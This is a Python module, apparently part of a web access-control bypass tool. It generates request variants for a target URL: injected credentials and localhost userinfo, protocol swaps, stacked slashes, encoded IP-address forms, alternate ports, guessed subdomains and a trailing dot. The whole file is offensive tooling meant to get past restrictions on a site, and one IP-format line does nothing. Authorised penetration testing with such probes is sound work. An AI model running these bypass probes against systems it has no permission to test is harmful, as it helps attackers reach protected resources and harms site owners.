#!/usr/bin/env python3
"""
Protocol-based bypass techniques
"""

import urllib.parse

class ProtocolBypass:
    def __init__(self, manager):
        self.manager = manager
        
    def get_tests(self):
        """Generate protocol bypass tests"""
        tests = []
        base_url = self.manager.target_url
        parsed = urllib.parse.urlparse(base_url)
        
        # Protocol variants
        protocols = ['http', 'https', 'HTTP', 'HTTPS', 'http://', 'https://']
        
        # URL variants
        url_variants = [
            base_url,
            base_url.replace('://', '://@'),
            base_url.replace('://', '://127.0.0.1@'),
            base_url.replace('://', '://localhost@'),
            base_url.replace('://', '://admin@'),
            base_url.replace('://', '://user:pass@'),
            base_url.replace('://', '://admin:admin@'),
            base_url.replace('://', '://test:test@'),
            base_url.replace('https://', 'http://'),
            base_url.replace('http://', 'https://'),
            base_url.replace('://', '://:80@'),
            base_url.replace('://', '://:443@'),
            base_url.replace('://', '://127.0.0.1:80@'),
            base_url.replace('://', '://localhost:80@'),
        ]
        
        # Add HTTP/HTTPS variants
        for variant in url_variants:
            if variant != base_url:
                tests.append({
                    'name': f'Protocol Variant: {variant[:50]}...',
                    'url': variant,
                    'headers': {},
                    'method': 'GET'
                })
        
        # Double slash bypass
        double_slash_urls = [
            base_url.replace('://', ':////'),
            base_url.replace('://', '://///'),
            base_url.replace('://', '://////'),
            base_url.replace('://', ':///'),
            base_url.replace('://', '://\\'),
            base_url.replace('://', ':///\\'),
        ]
        
        for url in double_slash_urls:
            tests.append({
                'name': f'Double Slash Bypass',
                'url': url,
                'headers': {},
                'method': 'GET'
            })
        
        # IP vs Domain
        if parsed.netloc:
            domain = parsed.netloc.split(':')[0]
            # Try to resolve to IP (simplified)
            try:
                import socket
                ip = socket.gethostbyname(domain)
                ip_url = base_url.replace(domain, ip)
                tests.append({
                    'name': f'IP Address Bypass: {ip}',
                    'url': ip_url,
                    'headers': {},
                    'method': 'GET'
                })
                
                # IP with different formats
                ip_formats = [
                    ip,
                    ip.replace('.', '/'),
                    ip.replace('.', '..'),
                    ip.replace('.', '.'),
                    ip.replace('.', '%2e'),
                    ip.replace('.', '%252e'),
                ]
                
                for ip_format in ip_formats:
                    if ip_format != ip:
                        ip_url = base_url.replace(domain, ip_format)
                        tests.append({
                            'name': f'IP Format Bypass: {ip_format}',
                            'url': ip_url,
                            'headers': {},
                            'method': 'GET'
                        })
            except:
                pass
        
        # Port manipulation
        port_variants = [':80', ':443', ':8080', ':8443', ':8000', ':3000', ':5000']
        for port in port_variants:
            if port not in base_url:
                port_url = base_url.replace(parsed.netloc, parsed.netloc + port)
                tests.append({
                    'name': f'Port Bypass: {port}',
                    'url': port_url,
                    'headers': {},
                    'method': 'GET'
                })
        
        # Subdomain variations
        subdomains = ['www.', 'ww2.', 'ww3.', 'dev.', 'test.', 'stage.', 'prod.', 'api.', 'admin.']
        for sub in subdomains:
            if sub not in parsed.netloc:
                sub_url = base_url.replace(parsed.netloc, sub + parsed.netloc)
                tests.append({
                    'name': f'Subdomain Bypass: {sub}',
                    'url': sub_url,
                    'headers': {},
                    'method': 'GET'
                })
        
        # Trailing dot bypass
        dot_url = base_url.replace(parsed.netloc, parsed.netloc + '.')
        tests.append({
            'name': 'Trailing Dot Bypass',
            'url': dot_url,
            'headers': {},
            'method': 'GET'
        })
        
        return tests
